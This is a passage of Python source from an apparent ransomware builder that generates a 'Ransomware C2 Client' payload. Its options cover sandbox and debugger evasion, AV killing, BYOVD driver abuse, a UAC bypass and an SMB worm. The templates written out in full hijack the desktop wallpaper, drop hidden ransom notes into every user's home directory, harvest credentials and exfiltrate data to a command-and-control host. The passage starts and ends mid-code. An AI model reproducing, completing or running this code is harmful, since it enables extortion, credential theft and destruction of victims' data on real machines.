        use_av_killer = include_windows and av_bypass
        use_byovd = include_windows and byovd_enabled and privilege_esc
        use_smb_worm = include_windows and smb_spread

        print("=" * 70)
        print("  TARGET OS: " + target_os_lower.upper())
        print("=" * 70)
        print("  Windows features: " + ("YES" if include_windows else "NO"))
        print("  Linux features:   " + ("YES" if include_linux else "NO"))
        print("  macOS features:   " + ("YES" if include_macos else "NO"))
        if not include_windows:
            print("  [DISABLED] UAC bypass")
            print("  [DISABLED] AV Killer")
            print("  [DISABLED] BYOVD")
            print("  [DISABLED] SMB Worm")
            print("  [DISABLED] AMSI/ETW patch")
        print("=" * 70)

        ransom_note_escaped = ransom_note.replace('"', '\\"').replace("\n", "\\n")
        extensions_list = [e.strip() for e in extensions.split(",")]

        if use_hybrid:
            if not rsa_public_key_pem or not rsa_private_key_pem:
                print("[*] Generating RSA-4096 keypair...")
                rsa_private_key_pem, rsa_public_key_pem = (
                    RansomwareBuilder.generate_rsa_keypair(4096)
                )
                print("[+] RSA keypair generated")

            if "-----BEGIN" not in rsa_public_key_pem:
                print("[!] WARNING: Invalid RSA public key PEM!")
                use_hybrid = False

            victim_id = RansomwareBuilder._generate_victim_id()
            key_fingerprint = RansomwareBuilder._key_fingerprint(rsa_public_key_pem)
            print(f"[*] Victim ID: {victim_id}")
            print(f"[*] Key fingerprint: {key_fingerprint}")
        else:
            victim_id = "N/A"
            key_fingerprint = "N/A"

        if not decrypt_key:
            decrypt_key = "".join(
                random.choices(string.ascii_letters + string.digits, k=32)
            )

        wallpaper_bool = "True" if wallpaper else "False"
        exfiltrate_bool = "True" if exfiltrate else "False"
        use_gui_bool = "True" if use_gui else "False"
        av_bypass_bool = "True" if av_bypass else "False"
        privilege_esc_bool = "True" if privilege_esc else "False"
        parallel_bool = "True" if parallel else "False"
        use_credentials_bool = "True" if use_credentials else "False"
        use_hybrid_bool = "True" if (use_hybrid and encryption == "hybrid") else "False"
        change_icons_bool = "True" if change_desktop_icons_flag else "False"
        post_exploit_bool = "True" if post_exploit_enabled else "False"

        ext_list_str = "[" + ", ".join([f'"{e}"' for e in extensions_list]) + "]"

        actions_parsed = [
            a.strip() for a in post_exploit_actions.split(",") if a.strip()
        ]
        actions_str = "[" + ", ".join([f'"{a}"' for a in actions_parsed]) + "]"

        if polymorphic:
            names = RansomwareBuilder._generate_polymorphic_helpers()
        else:
            names = {
                k: k.replace("_fn", "")
                for k in [
                    "check_vm_fn",
                    "check_debug_fn",
                    "wipe_logs_fn",
                    "anti_recovery_fn",
                    "self_delete_fn",
                    "delay_fn",
                    "obf_str_fn",
                    "sysinfo_fn",
                    "timer_fn",
                    "exit_fn",
                    "byovd_install_fn",
                    "byovd_open_fn",
                    "byovd_steal_fn",
                    "byovd_cleanup_fn",
                    "byovd_killav_fn",
                    "byovd_etw_fn",
                    "byovd_writephys_fn",
                    "byovd_readphys_fn",
                ]
            }

        driver_b64 = ""
        if use_byovd:
            driver_b64 = RansomwareBuilder._embed_driver_b64(byovd_driver)

        anti_opts = {
            "ANTI_VM": anti_vm,
            "ANTI_DEBUG": anti_debug,
            "ANTI_FORENSIC": anti_forensic,
            "ANTI_DUMP": anti_dump,
            "ANTI_RECOVERY": anti_recovery,
            "ANTI_TIMING": anti_timing,
            "ANTI_SANDBOX_USER": anti_sandbox_user,
            "ANTI_SANDBOX_DISK": anti_sandbox_disk,
            "ANTI_SANDBOX_RAM": anti_sandbox_ram,
            "ANTI_SANDBOX_CPU": anti_sandbox_cpu,
            "ANTI_SANDBOX_UPTIME": anti_sandbox_uptime,
            "ANTI_NETWORK": anti_network,
            "SELF_DELETE": self_delete,
            "POLYMORPHIC": polymorphic,
            "TRIPLE_PASS": triple_pass,
            "ENCRYPT_HEADER": encrypt_header,
        }

        byovd_opts = {
            "BYOVD_ENABLED": byovd_enabled,
            "BYOVD_DRIVER": byovd_driver,
            "BYOVD_DRIVER_B64": driver_b64,
            "BYOVD_AUTO_KILL_AV": byovd_auto_kill_av,
            "BYOVD_DISABLE_ETW": byovd_disable_etw,
            "BYOVD_DISABLE_DEFENDER": byovd_disable_defender,
        }

        smb_opts = {
            "SMB_SPREAD": smb_spread,
            "SMB_METHODS": smb_methods,
            "SMB_MAX_HOSTS": smb_max_hosts,
            "SMB_SCAN_SUBNETS": smb_scan_subnets,
            "SMB_TIMEOUT": smb_timeout,
            "SMB_CREDENTIALS": smb_credentials,
            "SMB_PAYLOAD_NAME": smb_payload_name,
            "SMB_PERSIST": smb_persist,
            "SMB_SELF_EXEC": smb_self_exec,
        }

        # ═══ Generate blocks — conditional per OS ═══
        if include_windows:
            av_block = RansomwareBuilder._make_av_bypass_block(av_bypass, names)
            av_killer_block = (
                RansomwareBuilder._make_av_killer_block(names)
                if use_av_killer
                else "\n# AV Killer: disabled\n"
            )
            byovd_block = (
                RansomwareBuilder._make_byovd_block(byovd_opts, names)
                if use_byovd
                else "\n# BYOVD: disabled\n"
            )
            smb_block = (
                RansomwareBuilder._make_smb_worm_block(smb_opts, names)
                if use_smb_worm
                else "\n# SMB Worm: disabled\n"
            )
        else:
            print("[*] Target is not Windows - skipping Windows-only blocks")
            av_block = "\n# AV bypass / UAC: disabled (target not Windows)\n"
            av_killer_block = "\n# AV Killer: disabled (target not Windows)\n"

            # ═══════════════════════════════════════════════════════
            # ═══ FIX v6.4: Definisikan default variable untuk non-Windows
            # ═══════════════════════════════════════════════════════
            byovd_block = (
                "\n"
                "# ============ BYOVD (disabled - non-Windows target) ============\n"
                "BYOVD_ENABLED = False\n"
                f'BYOVD_DRIVER = "{byovd_driver}"\n'
                'BYOVD_DRIVER_B64 = ""\n'
                "BYOVD_HAS_EMBEDDED_DRIVER = False\n"
                "\n"
                "def _run_byovd_escalation():\n"
                "    return False\n"
                "\n"
                "# ============ END BYOVD ============\n"
            )
            smb_block = (
                "\n"
                "# ============ SMB WORM (disabled - non-Windows target) ============\n"
                "SMB_SPREAD_ENABLED = False\n"
                f"SMB_MAX_HOSTS = {smb_max_hosts}\n"
                "\n"
                "def _smb_spread():\n"
                "    return 0\n"
                "\n"
                "def _start_smb_spread_thread():\n"
                "    pass\n"
                "\n"
                "# ============ END SMB WORM ============\n"
            )

        anti_block = RansomwareBuilder._make_anti_analysis_block(
            lhost, lport, anti_opts, names
        )
        ransom_gui_block = RansomwareBuilder._make_ransom_gui_block(
            names,
            btc_address,
            ransom_note,
            rsa_private_key_pem,
            rsa_public_key_pem,
            victim_id,
            key_fingerprint,
            encryption,
        )
        icons_embedded = RansomwareBuilder._desktop_icons_embedded_code()
        post_exploit_block = RansomwareBuilder._read_post_exploit_module()

        pub_key_escaped = rsa_public_key_pem.replace("\\", "\\\\")

        # ═══ WALLPAPER BLOCK ═══
        wallpaper_block = r"""
def _get_wallpaper_file():
    try:
        wallpaper_path = os.path.join(tempfile.gettempdir(), "ransom_wallpaper.png")
        WALLPAPER_URLS = [
            "https://raw.githubusercontent.com/RevilCipher/LazyFramework/main/resources/os_images/images.jpeg",
            "https://placehold.co/1920x1080/000000/FF0000.png?text=ENCRYPTED",
        ]
        import urllib.request
        import ssl
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        for url in WALLPAPER_URLS:
            try:
                req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
                with urllib.request.urlopen(req, timeout=20, context=ctx) as resp:
                    data = resp.read()
                if len(data) < 1024:
                    continue
                with open(wallpaper_path, "wb") as f:
                    f.write(data)
                return wallpaper_path
            except Exception:
                continue
        try:
            import struct as _struct
            import zlib as _zlib
            def _make_png(w=1920, h=1080, bg=(10, 0, 0)):
                row = bytes(bg) * w
                raw = b""
                for _ in range(h):
                    raw += b"\x00" + row
                def _chunk(ctype, data):
                    c = ctype + data
                    return _struct.pack(">I", len(data)) + c + _struct.pack(">I", _zlib.crc32(c) & 0xFFFFFFFF)
                ihdr = _struct.pack(">IIBBBBB", w, h, 8, 2, 0, 0, 0)
                idat = _zlib.compress(raw, 9)
                return (b"\x89PNG\r\n\x1a\n" + _chunk(b"IHDR", ihdr) +
                        _chunk(b"IDAT", idat) + _chunk(b"IEND", b""))
            png_data = _make_png()
            with open(wallpaper_path, "wb") as f:
                f.write(png_data)
            return wallpaper_path
        except Exception:
            return None
    except Exception:
        return None


def _wallpaper_windows(path):
    ok = False
    try:
        ok = ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 3)
    except Exception:
        pass
    try:
        subprocess.run(
            ["reg", "add", r"HKCU\Control Panel\Desktop",
             "/v", "Wallpaper", "/t", "REG_SZ", "/d", path, "/f"],
            capture_output=True, timeout=5, creationflags=0x08000000)
        ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 3)
    except Exception:
        pass
    return ok


def _detect_desktop_env():
    info = {"de": "unknown", "session_type": "unknown"}
    desktop = (
        os.environ.get("XDG_CURRENT_DESKTOP", "") or
        os.environ.get("DESKTOP_SESSION", "") or
        os.environ.get("XDG_SESSION_DESKTOP", "") or ""
    ).lower()
    session_type = (os.environ.get("XDG_SESSION_TYPE", "") or "").lower()
    if not session_type:
        if os.environ.get("WAYLAND_DISPLAY"):
            session_type = "wayland"
        elif os.environ.get("DISPLAY"):
            session_type = "x11"
    info["session_type"] = session_type or "x11"
    de_patterns = {
        "gnome": ["gnome", "ubuntu:gnome", "ubuntu", "pop", "elementary", "pantheon"],
        "kde": ["kde", "plasma"],
        "xfce": ["xfce"],
        "mate": ["mate"],
        "cinnamon": ["cinnamon", "x-cinnamon"],
        "lxde": ["lxde"],
        "lxqt": ["lxqt"],
        "budgie": ["budgie"],
        "deepin": ["deepin", "dde"],
        "sway": ["sway"],
        "hyprland": ["hyprland"],
        "i3": ["i3"],
    }
    for de_name, patterns in de_patterns.items():
        if any(p in desktop for p in patterns):
            info["de"] = de_name
            break
    else:
        info["de"] = _detect_de_via_process()
    return info


def _detect_de_via_process():
    try:
        r = subprocess.run(
            ["ps", "-eo", "comm"],
            capture_output=True, text=True, timeout=5,
        )
        comms = r.stdout.lower()
        if "gnome-shell" in comms:
            return "gnome"
        if "plasmashell" in comms:
            return "kde"
        if "xfce4-session" in comms or "xfwm4" in comms:
            return "xfce"
        if "cinnamon" in comms:
            return "cinnamon"
        if "mate-session" in comms or "marco" in comms:
            return "mate"
        if "lxsession" in comms:
            return "lxde"
        if "lxqt-session" in comms:
            return "lxqt"
        if "budgie-desktop" in comms:
            return "budgie"
        if "dde-dock" in comms:
            return "deepin"
        if "sway" in comms:
            return "sway"
        if "hyprland" in comms:
            return "hyprland"
        if "i3" in comms:
            return "i3"
    except Exception:
        pass
    return "unknown"


def _find_desktop_user():
    import pwd
    if os.getuid() != 0:
        try:
            return {
                "uid": os.getuid(),
                "user": pwd.getpwuid(os.getuid()).pw_name,
                "home": os.path.expanduser("~"),
            }
        except Exception:
            pass
    candidates = []
    try:
        r = subprocess.run(
            ["ps", "-eo", "uid,comm"],
            capture_output=True, text=True, timeout=5,
        )
        for line in r.stdout.splitlines():
            parts = line.split(None, 1)
            if len(parts) < 2:
                continue
            try:
                uid = int(parts[0])
                comm = parts[1].lower()
                if uid != 0 and any(de in comm for de in [
                    "gnome-shell", "plasmashell", "xfce4-session",
                    "cinnamon", "mate-session", "lxsession",
                    "lxqt-session", "budgie-desktop", "dde-dock",
                    "sway", "hyprland", "i3", "xfwm4", "mutter", "kwin",
                ]):
                    if uid not in [c["uid"] for c in candidates]:
                        candidates.append({"uid": uid})
            except ValueError:
                continue
    except Exception:
        pass
    if not candidates:
        try:
            r = subprocess.run(
                ["loginctl", "list-sessions", "--no-legend"],
                capture_output=True, text=True, timeout=5,
            )
            if r.returncode == 0:
                for line in r.stdout.splitlines():
                    parts = line.split()
                    if len(parts) >= 3:
                        try:
                            uid = int(parts[2])
                            if uid != 0:
                                candidates.append({"uid": uid})
                        except (ValueError, IndexError):
                            continue
        except Exception:
            pass
    if not candidates:
        try:
            if os.path.isdir("/run/user"):
                for entry in os.listdir("/run/user"):
                    try:
                        uid = int(entry)
                        if uid != 0 and os.path.exists(f"/run/user/{uid}/bus"):
                            candidates.append({"uid": uid})
                    except ValueError:
                        continue
        except Exception:
            pass
    for c in candidates:
        try:
            pwd_info = pwd.getpwuid(c["uid"])
            return {
                "uid": c["uid"],
                "user": pwd_info.pw_name,
                "home": pwd_info.pw_dir,
            }
        except KeyError:
            continue
    try:
        pwd_info = pwd.getpwuid(1000)
        return {"uid": 1000, "user": pwd_info.pw_name, "home": pwd_info.pw_dir}
    except KeyError:
        pass
    return None


def _make_user_env(desktop_uid, desktop_home, desktop_user, session_type="x11"):
    env = os.environ.copy()
    if session_type == "wayland":
        env["WAYLAND_DISPLAY"] = env.get("WAYLAND_DISPLAY", "wayland-0")
        env["XDG_RUNTIME_DIR"] = f"/run/user/{desktop_uid}"
    else:
        env["DISPLAY"] = env.get("DISPLAY", ":0")
        env["XAUTHORITY"] = os.path.join(desktop_home, ".Xauthority")
    env["XDG_RUNTIME_DIR"] = f"/run/user/{desktop_uid}"
    env["DBUS_SESSION_BUS_ADDRESS"] = f"unix:path=/run/user/{desktop_uid}/bus"
    env["HOME"] = desktop_home
    env["USER"] = desktop_user
    env["LOGNAME"] = desktop_user
    return env


def _run_as_desktop_user(cmd, desktop_uid, env, timeout=15):
    if os.getuid() == desktop_uid:
        try:
            return subprocess.run(cmd, capture_output=True, timeout=timeout, env=env, text=True)
        except Exception:
            return None
    if os.getuid() == 0:
        try:
            import pwd
            pwd_info = pwd.getpwuid(desktop_uid)
            def _drop():
                os.setgid(pwd_info.pw_gid)
                try:
                    os.initgroups(pwd_info.pw_name, pwd_info.pw_gid)
                except Exception:
                    pass
                os.setuid(desktop_uid)
            return subprocess.run(cmd, capture_output=True, timeout=timeout,
                                env=env, text=True, preexec_fn=_drop)
        except Exception:
            pass
    try:
        return subprocess.run(cmd, capture_output=True, timeout=timeout, env=env, text=True)
    except Exception:
        return None


def _wp_gnome(path, desktop_uid, env):
    uri = "file://" + path
    ok = False
    for key in ["picture-uri", "picture-uri-dark"]:
        r = _run_as_desktop_user(
            ["gsettings", "set", "org.gnome.desktop.background", key, uri],
            desktop_uid, env, timeout=10,
        )
        if r and r.returncode == 0:
            ok = True
    _run_as_desktop_user(
        ["gsettings", "set", "org.gnome.desktop.background", "picture-options", "zoom"],
        desktop_uid, env, timeout=5,
    )
    return ok


def _wp_cinnamon(path, desktop_uid, env):
    uri = "file://" + path
    ok = False
    for cmd in [
        ["gsettings", "set", "org.cinnamon.desktop.background", "picture-uri", uri],
        ["gsettings", "set", "org.cinnamon.desktop.background", "picture-options", "zoom"],
    ]:
        r = _run_as_desktop_user(cmd, desktop_uid, env, timeout=10)
        if r and r.returncode == 0:
            ok = True
    return ok


def _wp_mate(path, desktop_uid, env):
    ok = False
    for cmd in [
        ["gsettings", "set", "org.mate.background", "picture-filename", path],
        ["gsettings", "set", "org.mate.background", "picture-options", "zoom"],
    ]:
        r = _run_as_desktop_user(cmd, desktop_uid, env, timeout=10)
        if r and r.returncode == 0:
            ok = True
    if not ok:
        r = _run_as_desktop_user(
            ["caja", "--set-wallpaper", path],
            desktop_uid, env, timeout=10,
        )
        if r and r.returncode == 0:
            ok = True
    return ok


def _wp_xfce(path, desktop_uid, env):
    ok = False
    r = _run_as_desktop_user(
        ["xfconf-query", "-c", "xfce4-desktop", "-l"],
        desktop_uid, env, timeout=10,
    )
    if not r or r.returncode != 0:
        return False
    props = [l.strip() for l in r.stdout.splitlines()
             if l.strip().startswith("/backdrop/")]
    props_set = 0
    for prop in props:
        if prop.endswith("/last-image") or prop.endswith("/image-path") or prop.endswith("/last-single-image"):
            rr = _run_as_desktop_user(
                ["xfconf-query", "-c", "xfce4-desktop", "-p", prop,
                 "-s", path, "--create", "-t", "string"],
                desktop_uid, env, timeout=5,
            )
            if rr and rr.returncode == 0:
                props_set += 1
        elif prop.endswith("/image-show"):
            _run_as_desktop_user(
                ["xfconf-query", "-c", "xfce4-desktop", "-p", prop,
                 "-s", "true", "--create", "-t", "bool"],
                desktop_uid, env, timeout=5,
            )
        elif prop.endswith("/image-style"):
            _run_as_desktop_user(
                ["xfconf-query", "-c", "xfce4-desktop", "-p", prop,
                 "-s", "5", "--create", "-t", "int"],
                desktop_uid, env, timeout=5,
            )
    if props_set > 0:
        ok = True
        _run_as_desktop_user(
            ["xfdesktop", "--reload"],
            desktop_uid, env, timeout=10,
        )
    return ok


def _wp_kde(path, desktop_uid, env):
    import shutil as _sh
    qdbus_cmd = None
    for c in ["qdbus6", "qdbus", "qdbus-qt5"]:
        if _sh.which(c):
            qdbus_cmd = c
            break
    if not qdbus_cmd:
        return False
    plasma_script = (
        'var allDesktops = desktops();'
        'for (var i = 0; i < allDesktops.length; i++) {'
        '  var d = allDesktops[i];'
        '  d.wallpaperPlugin = "org.kde.image";'
        '  d.currentConfigGroup = Array("Wallpaper", "org.kde.image", "General");'
        '  d.writeConfig("Image", "file://' + path + '");'
        '}'
    )
    try:
        r = _run_as_desktop_user(
            [qdbus_cmd, "org.kde.plasmashell", "/PlasmaShell",
             "org.kde.PlasmaShell.evaluateScript", plasma_script],
            desktop_uid, env, timeout=15,
        )
        if r and r.returncode == 0:
            return True
    except Exception:
        pass
    if _sh.which("plasma-apply-wallpaperimage"):
        r = _run_as_desktop_user(
            ["plasma-apply-wallpaperimage", path],
            desktop_uid, env, timeout=15,
        )
        if r and r.returncode == 0:
            return True
    return False


def _wp_lxde_lxqt(path, desktop_uid, env):
    import shutil as _sh
    for tool in ["pcmanfm-qt", "pcmanfm"]:
        if _sh.which(tool):
            r = _run_as_desktop_user(
                [tool, "--set-wallpaper", path, "--wallpaper-mode=fit"],
                desktop_uid, env, timeout=10,
            )
            if r and r.returncode == 0:
                return True
    return False


def _wp_wayland(path, desktop_uid, env, compositor):
    import shutil as _sh
    if compositor == "sway" or _sh.which("swaymsg"):
        if _sh.which("swaybg"):
            subprocess.run(["pkill", "-u", str(desktop_uid), "-f", "swaybg"],
                          capture_output=True, timeout=5)
            try:
                if os.getuid() == 0:
                    import pwd
                    pwd_info = pwd.getpwuid(desktop_uid)
                    def _drop():
                        os.setgid(pwd_info.pw_gid)
                        try:
                            os.initgroups(pwd_info.pw_name, pwd_info.pw_gid)
                        except Exception:
                            pass
                        os.setuid(desktop_uid)
                    subprocess.Popen(
                        ["swaybg", "-i", path, "-m", "fill"],
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                        env=env, preexec_fn=_drop,
                    )
                else:
                    subprocess.Popen(
                        ["swaybg", "-i", path, "-m", "fill"],
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                        env=env,
                    )
                return True
            except Exception:
                pass
        if _sh.which("swaymsg"):
            r = _run_as_desktop_user(
                ["swaymsg", "output", "*", "bg", path, "fill"],
                desktop_uid, env, timeout=10,
            )
            if r and r.returncode == 0:
                return True
    if compositor == "hyprland" or _sh.which("hyprctl"):
        if _sh.which("hyprpaper"):
            subprocess.run(["pkill", "-u", str(desktop_uid), "-f", "hyprpaper"],
                          capture_output=True, timeout=5)
            time.sleep(1)
            try:
                if os.getuid() == 0:
                    import pwd
                    pwd_info = pwd.getpwuid(desktop_uid)
                    def _drop():
                        os.setgid(pwd_info.pw_gid)
                        try:
                            os.initgroups(pwd_info.pw_name, pwd_info.pw_gid)
                        except Exception:
                            pass
                        os.setuid(desktop_uid)
                    subprocess.Popen(
                        ["hyprpaper"],
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                        env=env, preexec_fn=_drop,
                    )
                else:
                    subprocess.Popen(
                        ["hyprpaper"],
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                        env=env,
                    )
                time.sleep(2)
                if _sh.which("hyprctl"):
                    _run_as_desktop_user(
                        ["hyprctl", "hyprpaper", "preload", path],
                        desktop_uid, env, timeout=10,
                    )
                    r = _run_as_desktop_user(
                        ["hyprctl", "monitors", "-j"],
                        desktop_uid, env, timeout=10,
                    )
                    if r and r.returncode == 0:
                        try:
                            import json as _json
                            monitors = _json.loads(r.stdout)
                            for mon in monitors:
                                mon_name = mon.get("name", "")
                                if mon_name:
                                    _run_as_desktop_user(
                                        ["hyprctl", "hyprpaper", "wallpaper",
                                         f"{mon_name},{path}"],
                                        desktop_uid, env, timeout=5,
                                    )
                        except Exception:
                            pass
                return True
            except Exception:
                pass
    return False


def _wp_universal_fallback(path, desktop_uid, env):
    import shutil as _sh
    tools = [
        ("feh", ["feh", "--bg-fill", path]),
        ("hsetroot", ["hsetroot", "-fill", path]),
        ("xwallpaper", ["xwallpaper", "--zoom", path]),
        ("nitrogen", ["nitrogen", "--set-zoom-fill", "--save", path]),
        ("xloadimage", ["xloadimage", "-onroot", "-fullscreen", path]),
        ("display", ["display", "-window", "root", path]),
    ]
    for tool_name, cmd in tools:
        if not _sh.which(tool_name):
            continue
        r = _run_as_desktop_user(cmd, desktop_uid, env, timeout=15)
        if r and r.returncode == 0:
            print("[+] Wallpaper via " + tool_name)
            return True
    return False


def _wallpaper_linux(path):
    print("[*] Linux wallpaper: detecting environment...")
    info = _detect_desktop_env()
    print(f"[*] DE: {info['de']} | Session: {info['session_type']}")
    user_info = _find_desktop_user()
    if not user_info:
        print("[!] Cannot determine desktop user")
        return False
    desktop_uid = user_info["uid"]
    desktop_user = user_info["user"]
    desktop_home = user_info["home"]
    print(f"[*] Desktop user: {desktop_user} (uid={desktop_uid})")
    env = _make_user_env(desktop_uid, desktop_home, desktop_user,
                        session_type=info["session_type"])
    de = info["de"]
    result = False
    try:
        if de == "gnome":
            result = _wp_gnome(path, desktop_uid, env)
        elif de == "cinnamon":
            result = _wp_cinnamon(path, desktop_uid, env)
        elif de == "mate":
            result = _wp_mate(path, desktop_uid, env)
        elif de == "xfce":
            result = _wp_xfce(path, desktop_uid, env)
        elif de == "kde":
            result = _wp_kde(path, desktop_uid, env)
        elif de in ("lxde", "lxqt"):
            result = _wp_lxde_lxqt(path, desktop_uid, env)
        elif de == "budgie":
            result = _wp_gnome(path, desktop_uid, env)
        elif de == "deepin":
            result = _wp_gnome(path, desktop_uid, env)
        elif de in ("sway", "hyprland"):
            result = _wp_wayland(path, desktop_uid, env, de)
        elif de == "i3":
            result = _wp_universal_fallback(path, desktop_uid, env)
        else:
            print("[*] Unknown DE, trying GNOME first...")
            result = _wp_gnome(path, desktop_uid, env)
            if not result:
                result = _wp_cinnamon(path, desktop_uid, env)
            if not result:
                result = _wp_mate(path, desktop_uid, env)
    except Exception as e:
        print("[!] DE-specific wallpaper error: " + str(e))
        result = False
    if not result:
        print("[*] Trying universal fallback...")
        result = _wp_universal_fallback(path, desktop_uid, env)
    if result:
        print("[+] Wallpaper changed successfully (" + de + ")")
    else:
        print("[!] All wallpaper methods failed for DE: " + de)
    return result


def _wallpaper_macos(path):
    try:
        script = ('tell application "System Events" to tell every desktop to '
                  'set picture to "' + path + '"')
        r = subprocess.run(["osascript", "-e", script],
                          capture_output=True, timeout=10, text=True)
        return r.returncode == 0
    except Exception:
        return False


def change_wallpaper():
    if not WALLPAPER_CHANGE:
        return
    try:
        path = _get_wallpaper_file()
        if not path or not os.path.exists(path):
            return
        if IS_WINDOWS:
            _wallpaper_windows(path)
        elif IS_MACOS:
            _wallpaper_macos(path)
        elif IS_LINUX:
            _wallpaper_linux(path)
    except Exception as e:
        print("[!] change_wallpaper error: " + str(e))
"""

        # ═══ RANSOM NOTE BLOCK ═══
        ransom_note_block = r"""
def drop_ransom_note():
    if USE_HYBRID:
        victim_info = (
            "\n\n" + "=" * 60 +
            "\nVICTIM ID: " + RANSOM_VICTIM_ID +
            "\nKEY FINGERPRINT: " + RANSOM_KEY_FINGERPRINT +
            "\nENCRYPTION: HYBRID RSA-4096 + AES-256-GCM" +
            "\n" + "=" * 60 + "\n"
        )
    else:
        victim_info = "\n\nDECRYPTION KEY: " + DECRYPT_KEY + "\n"
    content = RANSOM_NOTE + victim_info
    targets = []
    seen = set()
    def _add(p):
        if not p:
            return
        try:
            if os.path.isdir(p):
                norm = os.path.normcase(os.path.normpath(p))
                if norm not in seen:
                    seen.add(norm)
                    targets.append(p)
        except Exception:
            pass
    home = os.path.expanduser("~")
    if home:
        _add(home)
        _add(os.path.join(home, "Desktop"))
    if IS_LINUX:
        _add("/root")
        _add("/root/Desktop")
        if os.path.isdir("/home"):
            try:
                for u in os.listdir("/home"):
                    uh = os.path.join("/home", u)
                    if os.path.isdir(uh):
                        _add(uh)
                        _add(os.path.join(uh, "Desktop"))
            except Exception:
                pass
    if IS_WINDOWS:
        up = os.environ.get("USERPROFILE", "")
        if up:
            _add(up)
            _add(os.path.join(up, "Desktop"))
        pub = os.environ.get("PUBLIC", r"C:\Users\Public")
        _add(os.path.join(pub, "Desktop"))
    if IS_MACOS:
        if os.path.isdir("/Users"):
            try:
                for u in os.listdir("/Users"):
                    if u.startswith("."):
                        continue
                    uh = os.path.join("/Users", u)
                    if os.path.isdir(uh):
                        _add(uh)
                        _add(os.path.join(uh, "Desktop"))
            except Exception:
                pass
    if not targets:
        _add("/tmp")
    written = 0
    for target_dir in targets:
        fpath = os.path.join(target_dir, "README_RANSOM.txt")
        try:
            with open(fpath, "w", encoding="utf-8", newline="\n") as f:
                f.write(content)
            written += 1
            if IS_WINDOWS:
                try:
                    subprocess.run(["attrib", "+H", "+S", fpath],
                                  capture_output=True, timeout=3, creationflags=0x08000000)
                except Exception:
                    pass
        except Exception:
            continue
    print("[+] Ransom notes: " + str(written))
    return written
"""

        # ═══ POST-EXPLOIT PHASE WRAPPER ═══
        post_exploit_phase = (
            """
# ===================================================================
# POST-EXPLOITATION PHASE
# ===================================================================

POST_EXPLOIT_ENABLED = """
            + post_exploit_bool
            + """
POST_EXPLOIT_ACTIONS = """
            + actions_str
            + """
POST_EXPLOIT_MAX_EXFIL_MB = """
            + str(post_exploit_max_exfil_mb)
            + '''
POST_EXPLOIT_EXFIL_METHOD = "'''
            + post_exploit_exfil_method
            + '''"
POST_EXPLOIT_EXFIL_CATEGORIES = "'''
            + post_exploit_exfil_categories
            + """"


def _run_post_exploitation_phase():
    if not POST_EXPLOIT_ENABLED:
        return None
    print("")
    print("=" * 70)
    print("PHASE 1: POST-EXPLOITATION")
    print("=" * 70)
    results = {
        "credentials": {},
        "discovery": {},
        "exfiltration": {},
        "metadata": {
            "hostname": socket.gethostname(),
            "user": os.environ.get("USERNAME", os.environ.get("USER", "unknown")),
            "os": OS,
            "timestamp": datetime.now().isoformat(),
        },
    }
    try:
        if "creds" in POST_EXPLOIT_ACTIONS:
            try:
                harvester = AdvancedCredentialHarvester(threads=10)
                creds = harvester.harvest_all()
                results["credentials"] = creds
                try:
                    harvester.save_results()
                except Exception:
                    pass
            except Exception as e:
                print("[!] Cred harvest error: " + str(e))
        if "discovery" in POST_EXPLOIT_ACTIONS:
            try:
                discovery = DeepDiscovery()
                disc = discovery.discover_all()
                results["discovery"] = disc
            except Exception as e:
                print("[!] Discovery error: " + str(e))
        if "exfil" in POST_EXPLOIT_ACTIONS:
            try:
                exfil = AdvancedExfiltration(
                    C2_HOST, C2_PORT,
                    method=POST_EXPLOIT_EXFIL_METHOD,
                    max_mb=POST_EXPLOIT_MAX_EXFIL_MB,
                )
                exfil_result = exfil.exfiltrate_all(POST_EXPLOIT_EXFIL_CATEGORIES)
                results["exfiltration"] = exfil_result
            except Exception as e:
                print("[!] Exfil error: " + str(e))
        print("[*] Sending results to C2...")
        _send_post_exploit_to_c2(results)
    except Exception as e:
        print("[!] Post-exploit phase error: " + str(e))
    print("=" * 70)
    return results


def _send_post_exploit_to_c2(results):
    try:
        global _GLOBAL_C2_CLIENT
        if _GLOBAL_C2_CLIENT is None:
            return False
        msg = {
            "type": "post_exploit",
            "action": "results",
            "data": results,
            "victim_id": RANSOM_VICTIM_ID if USE_HYBRID else "N/A",
            "hostname": socket.gethostname(),
            "timestamp": datetime.now().isoformat(),
        }
        _GLOBAL_C2_CLIENT.send_resp(msg)
        return True
    except Exception as e:
        print("[!] C2 send error: " + str(e))
        return False

"""
        )

        # ═══ FEATURE HEADER ═══
        header_lines = [
            "#!/usr/bin/env python3",
            "# -*- coding: utf-8 -*-",
            '"""',
            "Ransomware C2 Client",
            "=" * 60,
            "BUILD CONFIG:",
            f"  Target OS       : {target_os_lower.upper()}",
            f"  Encryption      : {encryption}",
            f"  Hybrid RSA      : {'YES' if use_hybrid else 'NO'}",
            f"  Post-Exploit    : {'YES' if post_exploit_enabled else 'NO'}",
            "",
            "FEATURES INCLUDED:",
            "  [Windows]",
        ]
        if include_windows:
            header_lines.append(
                f"    UAC Bypass    : "
                f"{'YES' if (av_bypass and privilege_esc) else 'NO'}"
            )
            header_lines.append(f"    AV Killer     : {'YES' if av_bypass else 'NO'}")
            header_lines.append(f"    AMSI/ETW      : {'YES' if av_bypass else 'NO'}")
            header_lines.append(
                f"    BYOVD         : "
                f"{'YES' if (byovd_enabled and privilege_esc) else 'NO'}"
            )
            header_lines.append(f"    SMB Worm      : {'YES' if smb_spread else 'NO'}")
            header_lines.append(
                f"    LSASS/SAM     : " f"{'YES' if post_exploit_enabled else 'NO'}"
            )
        else:
            header_lines.append("    (all disabled - not Windows target)")
        header_lines.append("  [Linux]")
        if include_linux:
            header_lines.append(f"    Multi-DE WP   : {'YES' if wallpaper else 'NO'}")
            header_lines.append(
                f"    Linux Privesc : {'YES' if privilege_esc else 'NO'}"
            )
            header_lines.append(
                f"    Wipe Logs     : {'YES' if anti_forensic else 'NO'}"
            )
        else:
            header_lines.append("    (all disabled - not Linux target)")
        header_lines.append("  [macOS]")
        if include_macos:
            header_lines.append(f"    osascript WP  : {'YES' if wallpaper else 'NO'}")
            header_lines.append(
